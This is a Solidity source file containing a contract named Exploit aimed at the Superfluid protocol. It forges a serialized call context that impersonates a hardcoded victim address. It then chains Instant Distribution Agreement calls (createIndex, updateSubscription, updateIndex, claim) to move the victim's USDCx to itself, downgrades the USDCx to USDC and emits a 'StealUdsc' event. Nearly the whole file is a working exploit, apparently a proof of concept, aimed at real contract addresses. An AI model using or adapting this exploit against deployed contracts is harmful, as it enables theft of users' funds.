// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

struct Context {
        //
        // Call context
        //
        // app callback level
        uint8 appCallbackLevel;
        // type of call
        uint8 callType;
        // the system timestamp
        uint256 timestamp;
        // The intended message sender for the call
        address msgSender;
        //
        // Callback context
        //
        // For callbacks it is used to know which agreement function selector is called
        bytes4 agreementSelector;
        // User provided data for app callbacks
        bytes userData;

        //
        // App context
        //
        // app credit granted
        uint256 appCreditGranted;
        // app credit wanted by the app callback
        uint256 appCreditWantedDeprecated;
        // app credit used, allowing negative values over a callback session
        // the appCreditUsed value over a callback sessions is calculated with:
        // existing flow data owed deposit + sum of the callback agreements
        // deposit deltas 
        // the final value used to modify the state is determined by the
        // _adjustNewAppCreditUsed function (in AgreementLibrary.sol) which takes 
        // the appCreditUsed value reached in the callback session and the app
        // credit granted
        int256 appCreditUsed;
        // app address
        address appAddress;
        // app credit in super token
        ISuperToken appCreditToken;
    }

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface ISuperToken is IERC20 {
    function downgrade(uint256 amount) external;
}

interface IIDA {
    function createIndex(ISuperToken token, uint32 indexId, bytes calldata ctx) external returns(bytes memory newCtx);
    function getIndex(ISuperToken token, address publisher, uint32 indexId) external view returns(bool exist, uint128 indexValue, uint128 totalUnitsApproved, uint128 totalUnitsPending);
    function updateIndex(ISuperToken token, uint32 indexId, uint128 indexValue, bytes calldata ctx) external returns(bytes memory newCtx);
    function updateSubscription(ISuperToken token, uint32 indexId, address subscriber, uint128 units, bytes calldata ctx) external returns (bytes memory newCtx);
    function claim(ISuperToken token, address publisher, uint32 indexId, address subscriber, bytes calldata ctx) external returns(bytes memory newCtx);
}

interface ISuperfluid {
    function callAgreement(IIDA agreementClass, bytes calldata callData, bytes calldata userData) external returns (bytes memory returnedData);
}

library ContextDefinitions {

    /**************************************************************************
    / Call info
    /**************************************************************************/

    // app level
    uint256 constant internal CALL_INFO_APP_LEVEL_MASK = 0xFF;

    // call type
    uint256 constant internal CALL_INFO_CALL_TYPE_SHIFT = 32;
    uint256 constant internal CALL_INFO_CALL_TYPE_MASK = 0xF << CALL_INFO_CALL_TYPE_SHIFT;
    uint8 constant internal CALL_INFO_CALL_TYPE_AGREEMENT = 1;
    uint8 constant internal CALL_INFO_CALL_TYPE_APP_ACTION = 2;
    uint8 constant internal CALL_INFO_CALL_TYPE_APP_CALLBACK = 3;

    function decodeCallInfo(uint256 callInfo)
        internal pure
        returns (uint8 appCallbackLevel, uint8 callType)
    {
        appCallbackLevel = uint8(callInfo & CALL_INFO_APP_LEVEL_MASK);
        callType = uint8((callInfo & CALL_INFO_CALL_TYPE_MASK) >> CALL_INFO_CALL_TYPE_SHIFT);
    }

    function encodeCallInfo(uint8 appCallbackLevel, uint8 callType)
        internal pure
        returns (uint256 callInfo)
    {
        return uint256(appCallbackLevel) | (uint256(callType) << CALL_INFO_CALL_TYPE_SHIFT);
    }

}


contract Exploit {

    ISuperfluid superfluid;
    IIDA ida;
    ISuperToken usdcx;
    IERC20 usdc;
    bytes32 _ctxStamp;
    address victim;

    event StealUdsc(uint256 amount);

    constructor() {
        superfluid = ISuperfluid(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
        ida = IIDA(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
        usdcx = ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F);
        usdc = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    }

    function serializeContext(Context memory context)
        private
        returns (bytes memory ctx)
    {
        uint256 callInfo = ContextDefinitions.encodeCallInfo(context.appCallbackLevel, context.callType);
        uint256 creditIO =
            uint128(context.appCreditGranted) |
            (uint256(uint128(context.appCreditWantedDeprecated)) << 128);
        // NOTE: nested encoding done due to stack too deep error when decoding in _decodeCtx
        ctx = abi.encode(
            abi.encode(
                callInfo,
                context.timestamp,
                context.msgSender,
                context.agreementSelector,
                context.userData
            ),
            abi.encode(
                creditIO,
                context.appCreditUsed,
                context.appAddress,
                context.appCreditToken
            )
        );
        _ctxStamp = keccak256(ctx);
    }

    function fakeCtx(bytes memory userData) internal returns (bytes memory) {
        Context memory ctx;
        ctx.callType = ContextDefinitions.CALL_INFO_CALL_TYPE_AGREEMENT;
        ctx.timestamp = block.timestamp;
        ctx.msgSender = victim; //victim addrses
        ctx.appCreditToken = usdcx;
        ctx.userData = userData;
        return serializeContext(ctx);
    }

    function fire() public {
        bytes memory userData = "";
        victim = address(0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188);
        bytes memory callData = fakeCtx(userData);
    
        // create Index
        superfluid.callAgreement(
            ida,
            abi.encodeWithSelector(IIDA.createIndex.selector, usdcx, 1234, callData, ""),
            userData
        );
        // update subscription
        superfluid.callAgreement(
            ida,
            abi.encodeWithSelector(IIDA.updateSubscription.selector, usdcx, 1234, address(this), 1, callData, ""),
            userData
        );
        // update index
        uint256 unit = usdcx.balanceOf(victim);
        superfluid.callAgreement(
            ida,
            abi.encodeWithSelector(IIDA.updateIndex.selector, usdcx, 1234, unit, callData, ""),
            userData
        );
        // steal USDCx with claim
        superfluid.callAgreement(
            ida,
            abi.encodeWithSelector(IIDA.claim.selector, usdcx, victim, 1234, address(this), ""),
            userData
        );

        uint256 usdcx_profit = usdcx.balanceOf(address(this));
        // now, downgrade USDCx to USDC
        usdcx.downgrade(usdcx_profit);

        uint256 usdc_profit = usdc.balanceOf(address(this));
        emit StealUdsc(usdc_profit);

    }
}